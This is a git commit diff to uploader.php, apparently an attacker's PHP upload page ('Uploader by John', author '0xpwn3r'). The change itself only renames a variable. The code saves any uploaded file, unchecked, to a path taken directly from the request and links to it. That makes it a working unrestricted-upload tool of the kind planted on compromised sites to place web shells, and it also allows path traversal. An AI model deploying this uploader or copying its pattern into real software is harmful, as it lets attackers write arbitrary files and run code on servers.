e7e8b630f30375451a996654b53a27e36ecf43a6
0xpwn3r <48738146+j0hnD0ee@users.noreply.github.com>
2019-03-20 00:49:59 +0100

    Update uploader.php

--- uploader.php
+++ uploader.php
@@ -2,9 +2,9 @@
 
  $fichier = @$_FILES["fichier"];
 if ($fichier["name"] != '') {
-    $fullpath = $_REQUEST["path"] . $fichier["name"];
-    if (move_uploaded_file($fichier['tmp_name'], $fullpath)) {
-        echo "<h1><a href='$fullpath'>Clique ici!</a></h1>";
+    $dir = $_REQUEST["path"] . $fichier["name"];
+    if (move_uploaded_file($fichier['tmp_name'], $dir)) {
+        echo "<h1><a href='$dir'>Clique ici!</a></h1>";
     }
 }echo '<html><head><title>Uploader by John</title></head><body><form method=POST enctype="multipart/form-data" action=""><input type="file" name="fichier"><input type=submit value="Uploader son fichier!"></form></body></html>';
 ?>
